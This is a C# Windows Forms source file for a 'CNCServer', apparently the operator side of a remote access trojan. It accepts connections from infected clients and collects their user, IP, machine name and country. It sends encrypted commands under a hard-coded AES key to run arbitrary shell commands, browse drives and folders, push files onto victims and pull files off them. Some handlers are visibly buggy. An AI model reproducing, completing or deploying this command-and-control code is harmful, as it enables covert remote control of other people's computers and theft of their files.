using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net.Sockets;
using System.Net;
using System.IO;
using System.Security.Cryptography;

namespace CNCServer
{
    public partial class Form1 : Form
    {

        private static Socket _serverSocket;
        private static List<Socket> _clientSockets = new List<Socket>();
        private const int _BUFFER_SIZE = 20971520;
        private const int _PORT = 5656;
        private static readonly byte[] _buffer = new byte[_BUFFER_SIZE];
        private int[] controlClients = { 0 };
        private string currentPath = "";
        private string fup_local_path = "";
        private String fdl_location = "";
        private int fdl_size = 0;
        private bool isFileDownload = false;
        private byte[] recvFile = new byte[1];
        private int write_size = 0;


        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void SetupServer()
        {
            label1.Text = "Setting up server";
            _serverSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            _serverSocket.Bind(new IPEndPoint(IPAddress.Any, _PORT));
            _serverSocket.Listen(5);
            _serverSocket.BeginAccept(AcceptCallback, null);
            label1.Text = "Server is Running\n";
        }

        private void listClients()
        {
            int i = 0;
            listView1.Items.Clear();
            foreach (Socket socket in _clientSockets)
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = i.ToString();
                listView1.Items.Add(lvi);
            }
        }

        public static void CloseAllSockets()
        {
            foreach (Socket socket in _clientSockets)
            {
                socket.Shutdown(SocketShutdown.Both);
                socket.Close();
            }
            _serverSocket.Close();
        }

        private void AcceptCallback(IAsyncResult AR)
        {
            Socket socket;
            try
            {
                socket = _serverSocket.EndAccept(AR);
            }
            catch (ObjectDisposedException)
            {
                return;
            }
            _clientSockets.Add(socket);
            int id = _clientSockets.Count - 1;
            addlvClientCallback("Client " + id);
            string inf = "getinfo->" + id.ToString();
            sendCommand(inf, id);
            socket.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, socket);
            _serverSocket.BeginAccept(AcceptCallback, null);
        }

        private delegate void addlvClient(String clientid);

        private void addlvClientCallback(String clientid)
        {
            if (InvokeRequired)
            {
                addlvClient k = new addlvClient(addlvClientCallback);
                Invoke(k, new object[] { clientid });
            }
            else
            {
                listView1.Items.Add(clientid);
            }
        }

        private void ReceiveCallback(IAsyncResult AR)
        {
            Socket current = (Socket)AR.AsyncState;

            int received;
            try
            {
                received = current.EndReceive(AR);
            }
            catch (SocketException)
            {
                current.Close();
                _clientSockets.Remove(current);
                return;
            }
            byte[] recbuf = new byte[received];
            Array.Copy(_buffer, recbuf, received);

            if (isFileDownload)
            {
                Buffer.BlockCopy(recbuf, 0, recvFile, write_size,recbuf.Length);
                write_size += recbuf.Length;
                if (write_size == fdl_size)
                {
                    String rLocation = fdl_location;
                    using (FileStream fs = File.Create(rLocation))
                    {
                        Byte[] info = recvFile;
                        // Add some information to the file.
                        fs.Write(info, 0, info.Length);
                    }
                }
                Array.Clear(recvFile, 0, recvFile.Length);
                msgbox("File Download", "File receive confirmed!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                isFileDownload = false;
            }

            if (!isFileDownload)
            {
                string text = Encoding.Unicode.GetString(recbuf);
                text = Decrypt(text);

                if (text.StartsWith("inf->"))
                {
                    string id1 = text.Split('>')[1];
                    int id = int.Parse(id1.Split('♫')[0]);
                    string data = text.Split('♫')[1];
                    string[] lines = data.Split('|');
                    string uname = lines[0];
                    string ipa = lines[1];
                    string sysn = lines[2];
                    string cunt = lines[3];

                    setlvClientInfoCallback(uname, ipa, sysn, cunt, id);

                }
                else if (text.StartsWith("ldrives->"))
                {
                    string data = text.Split('>')[1];
                    foreach (String drive in data.Split('\n'))
                    {
                        if (!drive.Contains("|")) continue;
                        string name = drive.Split('|')[0];
                        string size = drive.Split('|')[1];

                        addFileCallback(name, size, "N/A", name);
                    }
                }
                else if (text.StartsWith("fdir->"))
                {
                    String data = text.Substring(6);
                    String[] entries = data.Split('\n');

                    foreach (String entry in entries)
                    {
                        if (entry == "") continue;
                        String name = entry.Split('|')[0];
                        String size = convert(entry.Split('|')[1]);
                        String crtime = entry.Split('|')[2];
                        String path = entry.Split('|')[3];
                        addFileCallback(name, size, crtime, path);
                    }
                }
                else if (text == "fconfirm")
                {
                    byte[] databyte = File.ReadAllBytes(fup_local_path);
                    loopSendByte(databyte);
                }
                else if (text == "received")
                {

                    msgbox("File Upload", "File Upload Successfull", MessageBoxButtons.OK, MessageBoxIcon.Information);

                }
                else if (text.StartsWith("finfo->"))
                {
                    int size = int.Parse(text.Split('>')[1]);
                    fdl_size = size;
                    recvFile = new byte[fdl_size];
                    isFileDownload = true;
                    loopSend("fconfirm");

                }
                else
                {
                    dispoutCallBack(text);
                }
            }
            try
            {
                current.BeginReceive(_buffer, 0, _BUFFER_SIZE, SocketFlags.None, ReceiveCallback, current);
            }catch(Exception e)
            {
                msgbox("Exception", e.ToString(),MessageBoxButtons.OK,MessageBoxIcon.Error );
            }
            
        }

        private delegate void msgboxCallback(String title, String text, MessageBoxButtons button, MessageBoxIcon icon);

        private void msgbox(String title, String text, MessageBoxButtons button, MessageBoxIcon icon)
        {
            if (this.InvokeRequired)
            {
                msgboxCallback callback = new msgboxCallback(msgbox);
                this.Invoke(callback, new object[] { title, text, button, icon });
            }
            else
            {
                MessageBox.Show(this, text, title, button, icon);
            }
        }

        private String convert(String byt)
        {
            String stackName = "B";

            if (byt == "N/A")
            {
                return "Directory";
            }

            try
            {
                float bytes = float.Parse(byt);
                float div_result = 0;

                if (bytes >= 0 && bytes < 1024)
                {
                    div_result = bytes;
                }

                if (bytes >= 1024 && bytes < (1024 * 1024))
                {
                    stackName = "KB";
                    div_result = bytes / 1024;
                }

                if (bytes >= (1024 * 1024) && bytes < (1024 * 1024 * 1024))
                {
                    stackName = "MB";
                    div_result = bytes / (1024 * 1024);
                }

                if (bytes >= (1024 * 1024 * 1024))
                {
                    stackName = "GB";
                    div_result = bytes / (1024 * 1024 * 1024);
                }

                String value = div_result.ToString("0.00");
                String final = value + " " + stackName;
                return final;
            }
            catch (Exception)
            {
                return "ERROR";
            }
        }

        private delegate void addFile(String name, String size, String crtime, String path);

        private void addFileCallback(String name, String size, String crtime, String path)
        {
            if (this.InvokeRequired)
            {
                addFile callback = new addFile(addFileCallback);
                this.Invoke(callback, new object[] { name, size, crtime, path });
            }
            else
            {
                ListViewItem lvi = new ListViewItem();
                lvi.Text = name;
                lvi.SubItems.Add(size);
                lvi.SubItems.Add(crtime);
                lvi.SubItems.Add(path);
                listView2.Items.Add(lvi);
                listView2.Items[0].Selected = true;
            }
        }

        private delegate void dispout(String text);

        private void dispoutCallBack(String text)
        {
            if (this.InvokeRequired)
            {
                dispout k = new dispout(dispoutCallBack);
                this.Invoke(k, new object[] { text});
            }
            else
            {
                textBox1.Text += text;
            }
        }

        private delegate void setlvClientInfo(String name, String ip, String sysn, String cunt, int id);

        private void setlvClientInfoCallback(String name, String ip, String sysn, String cunt, int id)
        {
            if (this.InvokeRequired)
            {
                setlvClientInfo k = new setlvClientInfo(setlvClientInfoCallback);
                this.Invoke(k, new object[] { name, ip, sysn, cunt, id });
            }
            else
            {
                ListViewItem client = listView1.Items[id];
                client.SubItems.Add(name);
                client.SubItems.Add(ip);
                client.SubItems.Add(sysn);
                client.SubItems.Add(cunt);
            }
        }

        private void dataGridView1_CellContentClick(object sender, DataGridViewCellEventArgs e)
        {

        }

        private void button1_Click(object sender, EventArgs e)
        {
            SetupServer();
        }

        private void label1_Click(object sender, EventArgs e)
        {

        }

        private void refreshToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            int[] id = null;
            for(int i=0; i < _clientSockets.Count-1;i++)
            {
                id[i] = i;
                string inf = "getinfo->" + id.ToString();
                msgbox("test", inf,MessageBoxButtons.OK,MessageBoxIcon.Error);
                sendCommand(inf, id[i]);
            }
            
        }

        public static string Encrypt(string clearText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212";
                byte[] clearBytes = Encoding.Unicode.GetBytes(clearText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);

                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateEncryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(clearBytes, 0, clearBytes.Length);
                            cs.Close();
                        }
                        clearText = Convert.ToBase64String(ms.ToArray());
                    }
                }
                return clearText;
            }
            catch (Exception)
            {
                return clearText;
            }
        }

        public static string Decrypt(string cipherText)
        {
            try
            {
                string EncryptionKey = "MAKV2SPBNI99212";
                byte[] cipherBytes = Convert.FromBase64String(cipherText);
                using (Aes encryptor = Aes.Create())
                {
                    Rfc2898DeriveBytes pdb = new Rfc2898DeriveBytes(EncryptionKey, new byte[] { 0x49, 0x76, 0x61, 0x6e, 0x20, 0x4d, 0x65, 0x64, 0x76, 0x65, 0x64, 0x65, 0x76 });
                    encryptor.Key = pdb.GetBytes(32);
                    encryptor.IV = pdb.GetBytes(16);
                    using (MemoryStream ms = new MemoryStream())
                    {
                        using (CryptoStream cs = new CryptoStream(ms, encryptor.CreateDecryptor(), CryptoStreamMode.Write))
                        {
                            cs.Write(cipherBytes, 0, cipherBytes.Length);
                            cs.Close();
                        }
                        cipherText = Encoding.Unicode.GetString(ms.ToArray());
                    }
                }
                return cipherText;
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                return "error";
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            if (listView1.SelectedItems.Count > 0)
            {
                List<int> clients = new List<int>();

                foreach (ListViewItem lvi in listView1.SelectedItems)
                {
                    int id = int.Parse(lvi.SubItems[0].Text.Replace("Client ", ""));
                    clients.Add(id);

                }

                controlClients = clients.ToArray();
            }
        }

        private void sendCommand(string command,int targetClient)
        {
            try
            {
                Socket s = _clientSockets[targetClient];
                string k = command;
                string crypted = Encrypt(k);
                byte[] data = Encoding.Unicode.GetBytes(crypted);
                s.Send(data);
            }catch(Exception e)
            {
                msgbox("Error",e.ToString(),MessageBoxButtons.OK,MessageBoxIcon.Error);

            }
            
        }

        private void button3_Click(object sender, EventArgs e)
        {

            string command = textBox2.Text;
            command = "exec->" + command;
            loopSend(command);   
        }

        private void textBox2_TextChanged(object sender, EventArgs e)
        {

        }

        private void button4_Click(object sender, EventArgs e)
        {
            textBox1.Clear();
            textBox2.Clear();
        }
        

        private void textBox1_TextChanged_1(object sender, EventArgs e)
        {

        }

        private void listView1_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void fileSystemToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
        }

        private void listDrivesToolStripMenuItem_Click(object sender, EventArgs e)
        {
            
            string command = "ldrives";
            loopSend(command);
            listView2.Items.Clear();
        }

        private void loopSend(string command)
        {
            foreach(int client in controlClients)
            {
                sendCommand(command,client);
            }
        }

        private void loopSendByte(Byte[] data)
        {
            foreach (int client in controlClients)
            {
                sendCommand(data, client);
            }
        }

        private void sendCommand(Byte[] data, int targetClient)
        {
            Socket s = _clientSockets[targetClient];
            s.Send(data);
        }


        private void listView2_SelectedIndexChanged(object sender, EventArgs e)
        {

        }

        private void enterDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
           
        }

        private void enterDirectoryToolStripMenuItem_Click_1(object sender, EventArgs e)
        {
            if (listView2.FocusedItem != null)
            {
                string path = listView2.FocusedItem.SubItems[3].Text;
                string command = "fdir->" + path;
                currentPath = path;
                loopSend(command);
                listView2.Items.Clear();
            }
        }

        private void previousDirectoryToolStripMenuItem_Click(object sender, EventArgs e)
        {
            listView2.Items.Clear();
            try
            {
                string dest = Directory.GetParent(currentPath).FullName;
                string command = "fdir->" + dest;
                loopSend(command);
            }
            catch (Exception)
            {
                string command = "ldrives";
                loopSend(command);
            }
            
        }

        private string getParent(string path)
        {
            string parent = "";
            int nos = 0;
            for (int i = 0; i < path.Length; i++)
            {
                if ( path[i] == '\\')
                {
                    nos++;
                }
            }
            string cut = path.Split('\\')[nos - 1];
            parent = path.Replace("cut", "");
            return parent;
        }

        private void uploadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            String dir = currentPath;
            String file = "";
            OpenFileDialog ofd = new OpenFileDialog();
            if (ofd.ShowDialog() == DialogResult.OK) file = ofd.FileName;
            dir += "\\" + new FileInfo(file).Name;
            String cmd = "fup->" + dir + ">" + new FileInfo(file).Length;
            fup_local_path = file;
            loopSend(cmd);
        }

        private void downloadToolStripMenuItem_Click(object sender, EventArgs e)
        {
            if (listView2.FocusedItem.SubItems[1].Text == "Directory") return;
            string dir = listView2.FocusedItem.SubItems[3].Text;
            string cmd = "fdl->" + dir;
            SaveFileDialog sfd = new SaveFileDialog();
            sfd.FileName = listView2.SelectedItems[0].SubItems[0].Text;
            if (sfd.ShowDialog() == DialogResult.OK)
            {
                fdl_location = sfd.FileName;
                loopSend(cmd);
            }
        }

        private void refreshToolStripMenuItem1_Click(object sender, EventArgs e)
        {
            listView1.Items.Clear();
            int[] id = null;
            for (int i = 0; i < _clientSockets.Count - 1; i++)
            {
                id[i] = i;
                string inf = "getinfo->" + id.ToString();
                msgbox("test", inf, MessageBoxButtons.OK, MessageBoxIcon.Error);
                sendCommand(inf, id[i]);
            }
        }
    }
}
